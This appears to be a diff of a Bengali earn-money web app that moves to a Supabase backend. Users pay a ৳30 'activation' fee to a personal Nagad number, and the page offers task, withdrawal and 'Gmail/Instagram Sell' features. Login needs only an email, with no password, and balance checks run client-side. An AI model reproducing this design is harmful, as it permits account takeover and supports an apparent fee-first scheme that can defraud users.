@@ -1,416 +1,1406 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="bn">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>BD Earn Hub</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
 <style>
 *{box-sizing:border-box}
+
 body{
- margin:0;
- background:#eef7f1;
- color:#222;
- font-family:Arial,"Noto Sans Bengali",sans-serif
+    margin:0;
+    background:#eef8f2;
+    font-family:Arial,"Noto Sans Bengali",sans-serif;
+    color:#222;
 }
+
 header{
- background:#087b18;
- color:white;
- text-align:center;
- padding:18px;
- font-size:24px;
- font-weight:bold
+    background:#087b18;
+    color:#fff;
+    text-align:center;
+    padding:18px;
+    font-size:25px;
+    font-weight:700;
 }
-.container{
- width:100%;
- max-width:650px;
- margin:auto;
- padding:18px
+
+.wrap{
+    max-width:680px;
+    margin:auto;
+    padding:16px;
 }
+
 .card{
- background:white;
- border-radius:16px;
- padding:20px;
- margin-bottom:18px;
- box-shadow:0 3px 15px rgba(0,0,0,.10)
+    background:#fff;
+    border-radius:16px;
+    padding:18px;
+    margin:14px 0;
+    box-shadow:0 4px 18px #0001;
 }
-.profile{text-align:center}
-.avatar{
- width:90px;
- height:90px;
- border-radius:50%;
- background:#087b18;
- color:white;
- display:flex;
- align-items:center;
- justify-content:center;
- font-size:40px;
- font-weight:bold;
- margin:auto
+
+h2{
+    color:#087b18;
+    margin-top:0;
 }
-h2{color:#087b18}
-.balance{
- background:#087b18;
- color:white;
- border-radius:14px;
- padding:22px;
- text-align:center;
- margin-top:15px
-}
-.balance strong{
- display:block;
- font-size:38px;
- margin-top:8px
-}
-.status{
- display:inline-block;
- padding:8px 15px;
- border-radius:20px;
- margin-top:10px;
- font-weight:bold
-}
-.active{background:#d9f7df;color:#087b18}
-.inactive{background:#ffdede;color:#d00000}
 
 .grid{
- display:grid;
- grid-template-columns:1fr 1fr;
- gap:12px
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:10px;
 }
-button{
- width:100%;
- border:0;
- border-radius:9px;
- padding:13px;
- margin-top:8px;
- font-size:16px;
- font-weight:bold;
- cursor:pointer
-}
-.green{background:#087b18;color:white}
-.red{background:#d90000;color:white}
-.gray{background:#555;color:white}
-.blue{background:#1976d2;color:white}
 
-input,textarea{
- width:100%;
- padding:13px;
- border:1px solid #ccc;
- border-radius:9px;
- margin-top:8px;
- font-size:16px
+button{
+    width:100%;
+    border:0;
+    border-radius:10px;
+    padding:13px;
+    font-size:16px;
+    font-weight:700;
+    cursor:pointer;
+    background:#087b18;
+    color:white;
+    margin-top:8px;
 }
-.task{
- background:#f3f3f3;
- border-radius:10px;
- padding:14px;
- margin-top:10px
+
+button.red{
+    background:#d90000;
 }
-.hidden{display:none}
-.small{font-size:13px;color:#666}
+
+button.gray{
+    background:#666;
+}
+
+button.orange{
+    background:#f39a00;
+}
+
+input,
+textarea,
+select{
+    width:100%;
+    padding:12px;
+    border:1px solid #ccc;
+    border-radius:9px;
+    margin:6px 0 10px;
+    font-size:15px;
+}
+
+textarea{
+    min-height:90px;
+    resize:vertical;
+}
+
+.balance{
+    background:#087b18;
+    color:white;
+    border-radius:14px;
+    text-align:center;
+    padding:22px;
+    font-size:30px;
+    font-weight:700;
+}
+
+.small{
+    color:#666;
+    font-size:13px;
+}
+
+.status{
+    padding:5px 9px;
+    border-radius:20px;
+    background:#eee;
+    display:inline-block;
+}
+
+.item{
+    background:#f5f5f5;
+    padding:12px;
+    border-radius:10px;
+    margin:8px 0;
+}
+
+.hidden{
+    display:none;
+}
+
 .notice{
- background:#fff3cd;
- padding:12px;
- border-radius:10px;
- margin-top:10px
+    background:#fff4c7;
+    padding:12px;
+    border-radius:10px;
+}
+
+.success{
+    background:#d9f6df;
+    padding:12px;
+    border-radius:10px;
+}
+
+.danger{
+    background:#ffdede;
+    padding:12px;
+    border-radius:10px;
+}
+
+a{
+    text-decoration:none;
 }
 </style>
 </head>
 
 <body>
 
-<header>🔐 BD Earn Hub</header>
+<header>
+    🔐 BD Earn Hub
+</header>
 
-<div class="container">
+<div class="wrap">
 
-<div class="card profile">
-  <div class="avatar">M</div>
-  <h2 id="userName">MD Siam</h2>
-  <div id="userPhone">01865501991</div>
-  <div id="statusBox" class="status active">🟢 Active</div>
+<!-- USER LOGIN / ACCOUNT -->
+<div id="auth" class="card">
 
-  <div class="balance">
-    Available Balance
-    <strong id="balance">৳0.00</strong>
-  </div>
-</div>
+    <h2>👤 User Account</h2>
 
-<div class="card">
-<h2>📋 Daily Tasks</h2>
-<div id="taskList"></div>
-</div>
+    <input
+        id="name"
+        placeholder="আপনার নাম"
+    >
 
-<div class="card">
-<h2>💸 Withdraw</h2>
+    <input
+        id="phone"
+        placeholder="মোবাইল নম্বর"
+    >
 
-<input id="withdrawAmount" type="number" placeholder="টাকার পরিমাণ">
-<input id="withdrawNumber" placeholder="বিকাশ/নগদ নম্বর">
+    <input
+        id="email"
+        type="email"
+        placeholder="ইমেইল"
+    >
 
-<button class="green" onclick="withdrawRequest()">
-💸 Withdraw Request
-</button>
+    <button onclick="register()">
+        Account তৈরি / Login
+    </button>
 
-<div id="withdrawMessage"></div>
-</div>
-
-<div class="card" id="activationCard">
-<h2>🔐 Account Activation</h2>
-
-<p>অ্যাকাউন্ট চালু করতে Transaction ID দিন।</p>
-
-<input id="trxId" placeholder="Transaction ID">
-
-<button class="green" onclick="submitTransaction()">
-🧾 Transaction ID Submit
-</button>
-
-<div id="trxMessage"></div>
-</div>
-
-<div class="card">
-<h2>🎁 Refer & Earn</h2>
-<p>আপনার Referral Code:</p>
-
-<input value="BD-EARN-001" readonly>
-
-<button class="gray"
-onclick="navigator.clipboard.writeText('BD-EARN-001')">
-📋 Copy Code
-</button>
-</div>
-
-<div class="card">
-<button class="gray" onclick="location.href='admin.html'">
-🔐 Admin Panel
-</button>
-</div>
+    <p class="small">
+        একই ইমেইল দিয়ে আবার ঢুকলে আগের account ব্যবহার হবে।
+    </p>
 
 </div>
+
+
+<!-- MAIN APP -->
+<div id="app" class="hidden">
+
+    <div class="card">
+
+        <h2 id="welcome">
+            👤 User
+        </h2>
+
+        <div class="balance">
+            Balance
+            <br>
+            ৳<span id="balance">0.00</span>
+        </div>
+
+        <p>
+            Account:
+            <span
+                id="activeStatus"
+                class="status"
+            >
+                Inactive
+            </span>
+        </p>
+
+    </div>
+
+
+    <!-- ACTIVATION -->
+    <div id="activation" class="card">
+
+        <h2>
+            🔴 Account Activation
+        </h2>
+
+        <div class="notice">
+
+            Nagad Send Money করুন
+            <b>৳30</b>
+
+            <br><br>
+
+            Send Money Number:
+            <b>01865501991</b>
+
+        </div>
+
+        <p>
+            Send Money করার পর Transaction ID দিন:
+        </p>
+
+        <input
+            id="activationTrx"
+            placeholder="Nagad Transaction ID"
+        >
+
+        <button onclick="submitActivation()">
+            ✅ Activation Request
+        </button>
+
+        <p
+            id="activationMsg"
+            class="small"
+        ></p>
+
+    </div>
+
+
+    <!-- SERVICES -->
+    <div id="services" class="hidden">
+
+        <div class="card">
+
+            <h2>
+                📋 Services
+            </h2>
+
+            <div class="grid">
+
+                <button onclick="showTasks()">
+                    💼 Daily Job
+                </button>
+
+                <button onclick="showService('instagram')">
+                    📷 Instagram Sell
+                </button>
+
+                <button onclick="showService('gmail')">
+                    📧 Gmail Sell
+                </button>
+
+                <button onclick="showService('telegram')">
+                    📣 Join Telegram
+                </button>
+
+                <button onclick="showWithdraw()">
+                    💸 Withdraw
+                </button>
+
+                <button
+                    class="gray"
+                    onclick="loadMyRequests()"
+                >
+                    🧾 My Requests
+                </button>
+
+            </div>
+
+        </div>
+
+
+        <!-- CONTENT -->
+        <div
+            id="content"
+            class="card"
+        >
+
+            <h2>
+                📌 Select an option
+            </h2>
+
+            <p class="small">
+                উপরের অপশন থেকে একটি নির্বাচন করুন।
+            </p>
+
+        </div>
+
+    </div>
+
+
+    <!-- LOGOUT -->
+    <button
+        class="red"
+        onclick="logout()"
+    >
+        Logout
+    </button>
+
+</div>
+
+</div>
+
 
 <script>
 
-const DEFAULT_DATA = {
- user:{
-   name:"MD Siam",
-   phone:"01865501991",
-   active:true,
-   balance:0,
-   activationPending:false
- },
- tasks:[
-   {
-     id:1,
-     title:"Facebook Page Follow",
-     description:"নির্দেশনা অনুযায়ী কাজটি সম্পন্ন করুন।",
-     reward:20,
-     status:"open"
-   },
-   {
-     id:2,
-     title:"Website Visit",
-     description:"ওয়েবসাইটটি ভিজিট করুন।",
-     reward:10,
-     status:"open"
-   }
- ],
- submissions:[],
- withdrawals:[],
- transactions:[]
-};
+/* =========================
+   SUPABASE CONFIG
+========================= */
 
-function getData(){
- let data=localStorage.getItem("bdEarnData");
+const SUPABASE_URL =
+"YOUR_SUPABASE_URL";
 
- if(!data){
-   localStorage.setItem("bdEarnData",JSON.stringify(DEFAULT_DATA));
-   return DEFAULT_DATA;
- }
+const SUPABASE_ANON_KEY =
+"YOUR_SUPABASE_ANON_KEY";
 
- return JSON.parse(data);
+const sb =
+supabase.createClient(
+    SUPABASE_URL,
+    SUPABASE_ANON_KEY
+);
+
+
+/* =========================
+   CURRENT USER
+========================= */
+
+let user = null;
+
+
+/* =========================
+   ESCAPE HTML
+========================= */
+
+function esc(value){
+
+    return String(value ?? '')
+        .replace(
+            /[&<>"']/g,
+            function(m){
+
+                return {
+
+                    '&':'&amp;',
+                    '<':'&lt;',
+                    '>':'&gt;',
+                    '"':'&quot;',
+                    "'":'&#39;'
+
+                }[m];
+
+            }
+        );
+
 }
 
-function saveData(data){
- localStorage.setItem("bdEarnData",JSON.stringify(data));
+
+/* =========================
+   REGISTER / LOGIN
+========================= */
+
+async function register(){
+
+    const name =
+        document
+        .getElementById('name')
+        .value
+        .trim();
+
+    const phone =
+        document
+        .getElementById('phone')
+        .value
+        .trim();
+
+    const email =
+        document
+        .getElementById('email')
+        .value
+        .trim()
+        .toLowerCase();
+
+
+    if(
+        !name ||
+        !phone ||
+        !email
+    ){
+
+        alert(
+            'নাম, মোবাইল ও ইমেইল দিন'
+        );
+
+        return;
+    }
+
+
+    const result =
+        await sb
+        .from('users')
+        .select('*')
+        .eq('email',email)
+        .maybeSingle();
+
+
+    if(result.error){
+
+        alert(
+            result.error.message
+        );
+
+        return;
+    }
+
+
+    let data =
+        result.data;
+
+
+    /* নতুন user */
+
+    if(!data){
+
+        const insertResult =
+            await sb
+            .from('users')
+            .insert({
+
+                name:name,
+                phone:phone,
+                email:email
+
+            })
+            .select()
+            .single();
+
+
+        if(insertResult.error){
+
+            alert(
+                insertResult.error.message
+            );
+
+            return;
+        }
+
+
+        data =
+            insertResult.data;
+
+    }
+
+
+    user =
+        data;
+
+
+    render();
+
 }
 
-function money(n){
- return "৳"+Number(n).toFixed(2);
+
+/* =========================
+   RENDER USER
+========================= */
+
+async function render(){
+
+    if(!user)
+        return;
+
+
+    const result =
+        await sb
+        .from('users')
+        .select('*')
+        .eq('id',user.id)
+        .single();
+
+
+    if(result.data){
+
+        user =
+            result.data;
+
+    }
+
+
+    document
+        .getElementById('auth')
+        .classList
+        .add('hidden');
+
+
+    document
+        .getElementById('app')
+        .classList
+        .remove('hidden');
+
+
+    document
+        .getElementById('welcome')
+        .textContent =
+        '👤 ' + user.name;
+
+
+    document
+        .getElementById('balance')
+        .textContent =
+        Number(
+            user.balance || 0
+        ).toFixed(2);
+
+
+    const status =
+        document
+        .getElementById('activeStatus');
+
+
+    if(user.active){
+
+        status.textContent =
+            '🟢 Active';
+
+        status.style.background =
+            '#d9f6df';
+
+        document
+            .getElementById('activation')
+            .classList
+            .add('hidden');
+
+
+        document
+            .getElementById('services')
+            .classList
+            .remove('hidden');
+
+    }else{
+
+        status.textContent =
+            '🔴 Inactive';
+
+        status.style.background =
+            '#ffdede';
+
+
+        document
+            .getElementById('activation')
+            .classList
+            .remove('hidden');
+
+
+        document
+            .getElementById('services')
+            .classList
+            .add('hidden');
+
+    }
+
 }
 
-function render(){
 
- const data=getData();
+/* =========================
+   ACTIVATION REQUEST
+========================= */
 
- document.getElementById("userName").innerText=data.user.name;
- document.getElementById("userPhone").innerText=data.user.phone;
- document.getElementById("balance").innerText=money(data.user.balance);
+async function submitActivation(){
 
- const status=document.getElementById("statusBox");
+    const trx =
+        document
+        .getElementById('activationTrx')
+        .value
+        .trim();
 
- if(data.user.active){
-   status.className="status active";
-   status.innerText="🟢 Active";
- }else{
-   status.className="status inactive";
-   status.innerText="🔴 Inactive";
- }
 
- const activation=document.getElementById("activationCard");
+    if(!trx){
 
- if(data.user.active){
-   activation.classList.add("hidden");
- }else{
-   activation.classList.remove("hidden");
- }
+        alert(
+            'Transaction ID দিন'
+        );
 
- const list=document.getElementById("taskList");
- list.innerHTML="";
+        return;
+    }
 
- const openTasks=data.tasks.filter(t=>t.status==="open");
 
- if(openTasks.length===0){
-   list.innerHTML="<p>এই মুহূর্তে কোনো Task নেই।</p>";
-   return;
- }
+    const result =
+        await sb
+        .from('activation_requests')
+        .insert({
 
- openTasks.forEach(task=>{
+            user_id:user.id,
 
-   const submitted=data.submissions.some(
-     s=>s.taskId===task.id && s.status==="pending"
-   );
+            trx_id:trx,
 
-   const div=document.createElement("div");
+            amount:30
 
-   div.className="task";
+        });
 
-   div.innerHTML=`
-     <h3>${task.title}</h3>
-     <p>${task.description}</p>
-     <b>Reward: ${money(task.reward)}</b>
 
-     ${
-       submitted
-       ?
-       `<button class="gray" disabled>⏳ Submitted</button>`
-       :
-       `<button class="green"
-          onclick="submitTask(${task.id})">
-          📤 Submit Task
-        </button>`
-     }
-   `;
+    const message =
+        document
+        .getElementById('activationMsg');
 
-   list.appendChild(div);
- });
+
+    if(result.error){
+
+        message.textContent =
+            result.error.message;
+
+    }else{
+
+        message.textContent =
+            '✅ Request Admin Panel-এ পাঠানো হয়েছে।';
+
+        message.className =
+            'success';
+
+    }
+
 }
 
-function submitTask(id){
 
- const data=getData();
+/* =========================
+   DAILY JOB
+========================= */
 
- const task=data.tasks.find(t=>t.id===id);
+async function showTasks(){
 
- if(!task)return;
+    const box =
+        document
+        .getElementById('content');
 
- if(!data.user.active){
-   alert("আপনার Account Active নয়।");
-   return;
- }
 
- data.submissions.push({
-   id:Date.now(),
-   taskId:id,
-   user:"MD Siam",
-   status:"pending",
-   reward:task.reward,
-   submittedAt:new Date().toISOString()
- });
+    box.innerHTML =
+        '<h2>💼 Daily Job</h2>' +
+        '<p>Loading...</p>';
 
- saveData(data);
 
- alert("Task Submit হয়েছে। Admin Approve করলে Reward Balance-এ যোগ হবে।");
+    const result =
+        await sb
+        .from('tasks')
+        .select('*')
+        .eq('is_open',true)
+        .order(
+            'created_at',
+            {
+                ascending:false
+            }
+        );
 
- render();
+
+    if(result.error){
+
+        box.innerHTML =
+            '<p>' +
+            esc(
+                result.error.message
+            ) +
+            '</p>';
+
+        return;
+    }
+
+
+    if(
+        !result.data ||
+        result.data.length === 0
+    ){
+
+        box.innerHTML =
+            '<h2>💼 Daily Job</h2>' +
+            '<p>এখন কোনো Task নেই।</p>';
+
+        return;
+    }
+
+
+    box.innerHTML =
+        '<h2>💼 Daily Job</h2>' +
+
+        result.data
+        .map(
+            function(task){
+
+                return `
+
+                <div class="item">
+
+                    <b>
+                        ${esc(task.title)}
+                    </b>
+
+                    <br>
+
+                    ${esc(
+                        task.description || ''
+                    )}
+
+                    <br><br>
+
+                    Reward:
+                    <b>
+                        ৳${Number(
+                            task.reward || 0
+                        ).toFixed(2)}
+                    </b>
+
+                    <textarea
+                        id="proof_${task.id}"
+                        placeholder="Task proof / submission"
+                    ></textarea>
+
+                    <button
+                        onclick="submitTask('${task.id}')"
+                    >
+                        📤 Submit Task
+                    </button>
+
+                </div>
+
+                `;
+
+            }
+        )
+        .join('');
+
 }
 
-function withdrawRequest(){
 
- const data=getData();
+/* =========================
+   SUBMIT TASK
+========================= */
 
- const amount=Number(
-   document.getElementById("withdrawAmount").value
- );
+async function submitTask(taskId){
 
- const number=
-   document.getElementById("withdrawNumber").value.trim();
+    const proof =
+        document
+        .getElementById(
+            'proof_' + taskId
+        )
+        .value
+        .trim();
 
- if(!data.user.active){
-   alert("Account Active নয়।");
-   return;
- }
 
- if(!amount || amount<=0){
-   alert("সঠিক Amount দিন।");
-   return;
- }
+    if(!proof){
 
- if(amount>data.user.balance){
-   alert("আপনার Balance যথেষ্ট নয়।");
-   return;
- }
+        alert(
+            'Submission / proof দিন'
+        );
 
- if(!number){
-   alert("Payment Number দিন।");
-   return;
- }
+        return;
+    }
 
- data.withdrawals.push({
-   id:Date.now(),
-   amount:amount,
-   number:number,
-   status:"pending",
-   createdAt:new Date().toISOString()
- });
 
- saveData(data);
+    const result =
+        await sb
+        .from('task_submissions')
+        .insert({
 
- document.getElementById("withdrawMessage").innerHTML=
-   '<div class="notice">✅ Withdraw Request পাঠানো হয়েছে।</div>';
+            task_id:taskId,
 
- document.getElementById("withdrawAmount").value="";
- document.getElementById("withdrawNumber").value="";
+            user_id:user.id,
+
+            proof:proof
+
+        });
+
+
+    if(result.error){
+
+        alert(
+            result.error.message
+        );
+
+    }else{
+
+        alert(
+            '✅ Task submission পাঠানো হয়েছে।'
+        );
+
+    }
+
 }
 
-function submitTransaction(){
 
- const data=getData();
+/* =========================
+   GMAIL / INSTAGRAM / TELEGRAM
+========================= */
 
- const trx=
-   document.getElementById("trxId").value.trim();
+async function showService(type){
 
- if(!trx){
-   alert("Transaction ID দিন।");
-   return;
- }
+    const box =
+        document
+        .getElementById('content');
 
- data.transactions.push({
-   id:Date.now(),
-   trxId:trx,
-   status:"pending",
-   createdAt:new Date().toISOString()
- });
 
- data.user.activationPending=true;
+    /* TELEGRAM */
 
- saveData(data);
+    if(type === 'telegram'){
 
- document.getElementById("trxMessage").innerHTML=
-   '<div class="notice">✅ Transaction ID জমা হয়েছে। Admin Verify করার পর Account Active হবে।</div>';
+        const result =
+            await sb
+            .from('settings')
+            .select('value')
+            .eq(
+                'key',
+                'telegram_link'
+            )
+            .maybeSingle();
 
- document.getElementById("trxId").value="";
+
+        const link =
+            result.data?.value || '#';
+
+
+        box.innerHTML = `
+
+            <h2>
+                📣 Join Telegram
+            </h2>
+
+            <p>
+                Admin দেওয়া Telegram
+                channel-এ join করুন।
+            </p>
+
+            <a
+                href="${esc(link)}"
+                target="_blank"
+            >
+
+                <button>
+                    Join Telegram
+                </button>
+
+            </a>
+
+        `;
+
+        return;
+
+    }
+
+
+    const title =
+        type === 'gmail'
+        ? '📧 Gmail Sell'
+        : '📷 Instagram Sell';
+
+
+    const placeholder =
+        type === 'gmail'
+        ? 'Gmail Address'
+        : 'Instagram Username';
+
+
+    box.innerHTML = `
+
+        <h2>
+            ${title}
+        </h2>
+
+        <p>
+            আপনার account/email বা
+            username এবং প্রয়োজনীয়
+            proof দিন।
+        </p>
+
+        <div class="notice">
+
+            ⚠️ Password এখানে দেবেন না।
+
+        </div>
+
+        <input
+            id="svc_account"
+            placeholder="${placeholder}"
+        >
+
+        <textarea
+            id="svc_proof"
+            placeholder="Proof / প্রয়োজনীয় তথ্য"
+        ></textarea>
+
+        <button
+            class="orange"
+            onclick="submitService('${type}')"
+        >
+
+            📤 Submit Request
+
+        </button>
+
+    `;
+
 }
 
-render();
+
+/* =========================
+   SERVICE SUBMISSION
+========================= */
+
+async function submitService(type){
+
+    const account =
+        document
+        .getElementById(
+            'svc_account'
+        )
+        .value
+        .trim();
+
+
+    const proof =
+        document
+        .getElementById(
+            'svc_proof'
+        )
+        .value
+        .trim();
+
+
+    if(!account){
+
+        alert(
+            'Account / Username দিন'
+        );
+
+        return;
+    }
+
+
+    const result =
+        await sb
+        .from('service_submissions')
+        .insert({
+
+            user_id:user.id,
+
+            service_type:type,
+
+            account:account,
+
+            proof:proof
+
+        });
+
+
+    if(result.error){
+
+        alert(
+            result.error.message
+        );
+
+    }else{
+
+        alert(
+            '✅ Request Admin Panel-এ পাঠানো হয়েছে।'
+        );
+
+    }
+
+}
+
+
+/* =========================
+   WITHDRAW PAGE
+========================= */
+
+async function showWithdraw(){
+
+    const box =
+        document
+        .getElementById('content');
+
+
+    box.innerHTML = `
+
+        <h2>
+            💸 Withdraw
+        </h2>
+
+        <p>
+            Available Balance:
+            <b>
+                ৳${Number(
+                    user.balance || 0
+                ).toFixed(2)}
+            </b>
+        </p>
+
+        <select id="wd_method">
+
+            <option>
+                Nagad
+            </option>
+
+            <option>
+                bKash
+            </option>
+
+        </select>
+
+        <input
+            id="wd_number"
+            placeholder="Nagad / bKash Number"
+        >
+
+        <input
+            id="wd_amount"
+            type="number"
+            min="1"
+            placeholder="Amount"
+        >
+
+        <button
+            onclick="submitWithdraw()"
+        >
+
+            💸 Withdraw Request
+
+        </button>
+
+    `;
+
+}
+
+
+/* =========================
+   WITHDRAW REQUEST
+========================= */
+
+async function submitWithdraw(){
+
+    const method =
+        document
+        .getElementById(
+            'wd_method'
+        )
+        .value;
+
+
+    const number =
+        document
+        .getElementById(
+            'wd_number'
+        )
+        .value
+        .trim();
+
+
+    const amount =
+        Number(
+            document
+            .getElementById(
+                'wd_amount'
+            )
+            .value
+        );
+
+
+    if(
+        !number ||
+        !amount ||
+        amount <= 0
+    ){
+
+        alert(
+            'সব তথ্য দিন'
+        );
+
+        return;
+    }
+
+
+    if(
+        amount >
+        Number(
+            user.balance || 0
+        )
+    ){
+
+        alert(
+            'Balance যথেষ্ট নয়'
+        );
+
+        return;
+    }
+
+
+    const result =
+        await sb
+        .from('withdrawals')
+        .insert({
+
+            user_id:user.id,
+
+            method:method,
+
+            account_number:number,
+
+            amount:amount
+
+        });
+
+
+    if(result.error){
+
+        alert(
+            result.error.message
+        );
+
+    }else{
+
+        alert(
+            '✅ Withdraw request পাঠানো হয়েছে।'
+        );
+
+    }
+
+}
+
+
+/* =========================
+   MY REQUESTS
+========================= */
+
+async function loadMyRequests(){
+
+    const box =
+        document
+        .getElementById('content');
+
+
+    box.innerHTML =
+        '<h2>🧾 My Requests</h2>' +
+        '<p>Loading...</p>';
+
+
+    const results =
+        await Promise.all([
+
+            sb
+            .from('activation_requests')
+            .select('*')
+            .eq(
+                'user_id',
+                user.id
+            )
+            .order(
+                'created_at',
+                {
+                    ascending:false
+                }
+            ),
+
+            sb
+            .from('task_submissions')
+            .select(
+                '*,tasks(title)'
+            )
+            .eq(
+                'user_id',
+                user.id
+            )
+            .order(
+                'created_at',
+                {
+                    ascending:false
+                }
+            ),
+
+            sb
+            .from('service_submissions')
+            .select('*')
+            .eq(
+                'user_id',
+                user.id
+            )
+            .order(
+                'created_at',
+                {
+                    ascending:false
+                }
+            ),
+
+            sb
+            .from('withdrawals')
+            .select('*')
+            .eq(
+                'user_id',
+                user.id
+            )
+            .order(
+                'created_at',
+                {
+                    ascending:false
+                }
+            )
+
+        ]);
+
+
+    const activation =
+        results[0].data || [];
+
+
+    const tasks =
+        results[1].data || [];
+
+
+    const services =
+        results[2].data || [];
+
+
+    const withdrawals =
+        results[3].data || [];
+
+
+    let html =
+        '<h2>🧾 My Requests</h2>';
+
+
+    activation.forEach(
+        function(item){
+
+            html += `
+
+            <div class="item">
+
+                Activation
+
+                • ${esc(
+                    item.trx_id
+                )}
+
+                • Status:
+                <b>
+                    ${esc(
+                        item.status
+                    )}
+                </b>
+
+            </div>
+
+            `;
+
+        }
+    );
+
+
+    tasks.forEach(
+        function(item){
+
+            html += `
+
+            <div class="item">
+
+                Task
+
+                • ${esc(
+                    item.tasks?.title
+                )}
+
+                • Status:
+                <b>
+                    ${esc(
+                        item.status
+                    )}
+                </b>
+
+            </div>
+
+            `;
+
+        }
+    );
+
+
+    services.forEach(
+        function(item){
+
+            html += `
+
+            <div class="item">
+
+                ${esc(
+                    item.service_type
+                )}
+
+                • ${esc(
+                    item.account
+                )}
+
+                • Status:
+                <b>
+                    ${esc(
+                        item.status
+                    )}
+                </b>
+
+            </div>
+
+            `;
+
+        }
+    );
+
+
+    withdrawals.forEach(
+        function(item){
+
+            html += `
+
+            <div class="item">
+
+                Withdraw
+
+                • ${esc(
+                    item.method
+                )}
+
+                • ৳${Number(
+                    item.amount || 0
+                ).toFixed(2)}
+
+                • Status:
+                <b>
+                    ${esc(
+                        item.status
+                    )}
+                </b>
+
+            </div>
+
+            `;
+
+        }
+    );
+
+
+    if(
+        activation.length === 0 &&
+        tasks.length === 0 &&
+        services.length === 0 &&
+        withdrawals.length === 0
+    ){
+
+        html +=
+            '<p>কোনো request নেই।</p>';
+
+    }
+
+
+    box.innerHTML =
+        html;
+
+}
+
+
+/* =========================
+   LOGOUT
+========================= */
+
+function logout(){
+
+    user =
+        null;
+
+    location.reload();
+
+}
 
 </script>
 
